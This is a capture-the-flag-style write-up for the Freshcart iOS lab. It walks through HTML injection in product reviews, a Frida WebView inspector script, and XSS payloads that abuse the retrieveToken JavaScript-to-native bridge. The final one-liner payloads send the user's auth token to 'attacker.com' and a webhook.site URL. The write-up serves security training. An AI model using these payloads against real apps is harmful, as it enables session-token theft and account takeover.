---
title: Freshcart - Mobile Hacking Lab
date: 2025-5-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase
---



<br />

**Introduction**

Welcome to the **iOS Application Security Lab: JavaScript-to-Native Bridge Exploitation Challenge**. This challenge is centered around a fictitious grocery app called Freshcart. Freshcart contains a critical vulnerability that allows token stealing by exploiting the JavaScript to native bridge. Your objective is to exploit this vulnerability to steal the token used within the app.

<br />

**Objective**

**Escape the Webview**: Your task is to craft a payload that exploits the vulnerability in the Freshcart app to steal the user's token via the JavaScript-native bridge.





<br /><br />



**Explore the app**



When you launch the app, you’ll see options to Register or Log in. Start by registering a new account, then log in.



![](/assets/img/mhl/Freshcart/5.jpg)

<br /><br />





![](/assets/img/mhl/Freshcart/6.jpg)

<br /><br />





Navigate to the store, pick any item, and submit a review with a title and content. When submitting the values `<u>title</u>` and `<u>content</u>` in the title and content fields, the application renders the HTML instead of displaying it as plain text. As a result, the content is shown with underlined formatting. The content field is vulnerable to HTML injection, which can be escalated to cross-site scripting (XSS).

<br />



![](/assets/img/mhl/Freshcart/4.jpg)



<br />

**Note:** The payload `<script>alert(1)</script>` won’t execute because the app uses `WKWebView` instead of `UIWebView`.

<br />

**Why WKWebView doesn’t show `alert()`**

- `UIWebView` used the old WebKit API and simply let JavaScript’s `alert()`, `confirm()`, and `prompt()` show native system dialogs automatically.
- `WKWebView` is **stricter** and does **not** show JavaScript alerts out of the box. Instead, it expects you to handle them yourself via a delegate (`WKUIDelegate`).

That’s why in WKWebView, if you call:

```
alert("Xss");
```

Nothing happens unless you’ve implemented the delegate in Swift/Objective-C.



<br /><br />



**Dynamic Analysis With Frida**

The application embeds a WebView, use Frida to hook the various WebView classes and enumerate their behavior. You can use the following script.

- [iOS_WebViews_inspector](https://github.com/Incognito-Lab/Frida-WebView-Inspector/blob/main/iOS_WebViews_inspector.js)



<br />

```javascript
if (ObjC.available) {

  //Check iOS Version
  function iOSVersionFunc() {
    var processInfo = ObjC.classes.NSProcessInfo.processInfo();
    var versionString = processInfo.operatingSystemVersionString().toString(); //E.g. Version 14.0 (Build XXXXX)
    var versionTemp = versionString.split(' ');
    var version = versionTemp[1]; //E.g. 14.0
    return version
  }

  function inspect_UIWebView(WebViewInstance) {
    console.log('URL: ', WebViewInstance.request().URL().toString());
  }

  function inspect_SFSafariViewController(SFSafariViewController) {
    //Do something;
  }

  function inspect_WKWebView(WebViewInstance) {
    console.log('URL: ', WebViewInstance.URL().toString());
    if (8.0 < iOSVersionFloat && iOSVersionFloat <= 14.0) {
      //WKWebView javaScriptEnabled deprecated after iOS 14.0
      console.log('javaScriptEnabled: ', WebViewInstance.configuration().preferences().javaScriptEnabled());
    } else if (iOSVersionFloat >= 14.1) {
      //WKWebView allowsContentJavaScript
      console.log('allowsContentJavaScript: ', WebViewInstance.configuration().defaultWebpagePreferences().allowsContentJavaScript());
    }
    console.log('allowFileAccessFromFileURLs: ', WebViewInstance.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', WebViewInstance.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ', WebViewInstance.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  }

  var iOSVersionStr = iOSVersionFunc();
  var iOSVersionFloat = parseFloat(iOSVersionStr)

  var UIWebView = ObjC.classes.UIWebView;
  if (UIWebView) {
    console.log(`===== Found UIWebView =====`);
    ObjC.choose(UIWebView, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        inspect_UIWebView(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for UIWebView! =====\n');
      }
    });
  }

  var WKWebView = ObjC.classes.WKWebView;
  if (WKWebView) {
    console.log(`===== Found WKWebView =====`);
    ObjC.choose(WKWebView, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        inspect_WKWebView(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for WKWebView! =====\n');
      }
    });
  }

  var SFSafariViewController = ObjC.classes.SFSafariViewController;
  if (SFSafariViewController) {
    console.log(`===== Found SFSafariViewController =====`);
    ObjC.choose(SFSafariViewController, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        //inspect_SFSafariViewController(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for SFSafariViewController! =====\n');
      }
    });
  }

  //Check if application use JavaScript Bridge (**Not tested yet**)
  //WKUserContentController
  var WKUserContentController = ObjC.classes.WKUserContentController;
  if (WKUserContentController) {
    Interceptor.attach(WKUserContentController['- addScriptMessageHandler:name:'].implementation, {
      onEnter: function (args) {
        console.log("===== Check if application use JavaScript Bridge (WKUserContentController) =====");
        console.log(`\nClasss: \'WKUserContentController\' Method: \'- addScriptMessageHandler:name:\' Called`);
        var handler = new ObjC.Object(args[2]);
        var name = new ObjC.Object(args[3]);
        console.log(name, '->', handler.$className);
      }
    });
  }

  //WebViewJavascriptBridge
  var WebViewJavascriptBridge = ObjC.classes.WebViewJavascriptBridge;
  if (WebViewJavascriptBridge) {
    Interceptor.attach(WebViewJavascriptBridge['- registerHandler:handler:'].implementation, {
      onEnter: function (args) {
        console.log("===== Check if application use JavaScript Bridge (WebViewJavascriptBridge) =====");
        console.log(`\nClasss: \'WebViewJavascriptBridge\' Method: \'- registerHandler:handler:\' Called`);
        var name = new ObjC.Object(args[2].toString());
        console.log(name, '->', handler.$className);
        //var handler = new ObjC.Object();
      }
    });
  }

  /*
    //Used to inspectloadHTMLString on WKWebView
    var WebViewClassName = "WKWebView"
    var methodName = "- loadHTMLString:baseURL:";
    var methodAddr = ObjC.classes[WebViewClassName][methodName].implementation;
    Interceptor.attach(methodAddr, {
      onEnter: function (args) {
        console.log(`\n======================================================================`);
        console.log(`Classs: \'${WebViewClassName}\' Method: \'${methodName}\' Called`);
        console.log(`HTML string: ${new ObjC.Object(ptr(args[2])).toString()}`);
        console.log(`Base URL: ${args[3].toString()}`);
      },
      onLeave: function (returnVal) {
        console.log(`Return Value: ${returnVal}`);
      }
    });
    */

}
```

<br />

output

```
Spawning `com.mobilehackinglab.FreshCart.J8L462KYQ8`...                 
===== Found UIWebView =====
===== done for UIWebView! =====

===== Found WKWebView =====
===== done for WKWebView! =====

Spawned `com.mobilehackinglab.FreshCart.J8L462KYQ8`. Resuming main thread!
[iOS Device::com.mobilehackinglab.FreshCart.J8L462KYQ8 ]-> ===== Check if application use JavaScript Bridge (WKUserContentController) =====

Classs: 'WKUserContentController' Method: '- addScriptMessageHandler:name:' Called
retrieveToken -> FreshCart.WebViewController
===== Check if application use JavaScript Bridge (WKUserContentController) =====

Classs: 'WKUserContentController' Method: '- addScriptMessageHandler:name:' Called
storeToken -> FreshCart.WebViewController
===== Check if application use JavaScript Bridge (WKUserContentController) =====

Classs: 'WKUserContentController' Method: '- addScriptMessageHandler:name:' Called
removeToken -> FreshCart.WebViewController
```

<br /><br />

---



**Analyze the JavaScript Code**

After unzipping the app, you’ll see a `Payload` folder. Navigate to `build/static/js` to find `main.adf11907.js`.

```
──(root㉿kali)-[/home/…/FreshCart.app/build/static/js]
└─# ls
453.0ee6c3d2.chunk.js  453.0ee6c3d2.chunk.js.map  main.adf11907.js  main.adf11907.js.LICENSE.txt  main.adf11907.js.map
```



<br />



I used [beautifier.io](https://beautifier.io/) to format the JavaScript code.

<br />

The code implements `retrieveToken`, a method that invokes the native bridge to request a token. The bridge relays this request to the iOS code for handling.

<br />

![](/assets/img/mhl/Freshcart/2.png)





<br />

```javascript
window.webkit.messageHandlers.retrieveToken.postMessage(null);
```

<br />

**window.webkit.messageHandlers**

- A special object automatically exposed in a WebView.
- It holds any message handlers that the native iOS code has registered.

**retrieveToken**

- This is the name of a specific handler set up on the iOS side.
- When called from JavaScript, it forwards the message to Objective-C/Swift code in the app.

**.postMessage(null)**

- Sends a message through that handler.
- In this case, the payload is `null` (but it could be any serializable object like strings, numbers, or JSON).





<br /><br />



**Exploit the Webview to Steal the Token**

This payload generates a `<div>` element to store the token output. Upon execution, the JavaScript invokes the `retrieveToken` message handler, and the retrieved token value is rendered inside the `<div>`.

```html
<div id="out">waiting...</div>
```

<br />

```javascript
(function() {
    window.addEventListener('message', e => {
        document.getElementById('out').textContent = (e && e.data && e.data.token) ? e.data.token : 'no token';
    }, {
        once: true
    });
    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.retrieveToken) {
        window.webkit.messageHandlers.retrieveToken.postMessage(null);
    } else {
        window.parent.postMessage({
            action: 'retrieveToken'
        }, '*');
    }
})()
```

<br />

The one-liner payload

```javascript
<div id="out">waiting...</div>

<img src="x" onerror="(function(){window.addEventListener('message',e=>{document.getElementById('out').textContent=(e&&e.data&&e.data.token)?e.data.token:'no token';},{once:true});if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.retrieveToken){window.webkit.messageHandlers.retrieveToken.postMessage(null);}else{window.parent.postMessage({action:'retrieveToken'},'*');}})()">
```

<br />



![](/assets/img/mhl/Freshcart/3.jpg)



<br /><br />

**Send the token to an attacker-controlled site**

```javascript
<img src="x" onerror="(function(){
  window.addEventListener('message',e=>{
    if(e && e.data && e.data.token){
      // Send token to your URL
      var i = new Image();
      i.src='https://attacker.com?token='+encodeURIComponent(e.data.token);
    }
  },{once:true});
  if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.retrieveToken){
    window.webkit.messageHandlers.retrieveToken.postMessage(null);
  }else{
    window.parent.postMessage({action:'retrieveToken'},'*');
  }
})()">
```

<br />

The one-liner payload

```javascript
<img src=x onerror="(function(){window.addEventListener('message',e=>{if(e&&e.data&&e.data.token){new Image().src='https://webhook.site/44c0-bd46-0d7a6a5280f9?token='+encodeURIComponent(e.data.token);console.log('sent to webhook');}else console.log('no token');},{once:true});(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.retrieveToken)?window.webkit.messageHandlers.retrieveToken.postMessage(null):window.parent.postMessage({action:'retrieveToken'},'*');})()">
```

<br /><br />



![](/assets/img/mhl/Freshcart/2.jpg)



<br /><br />

Submitting this payload causes the user’s authentication token to be exfiltrated to an attacker-controlled server.

<br /><br />

![](/assets/img/mhl/Freshcart/1.png)
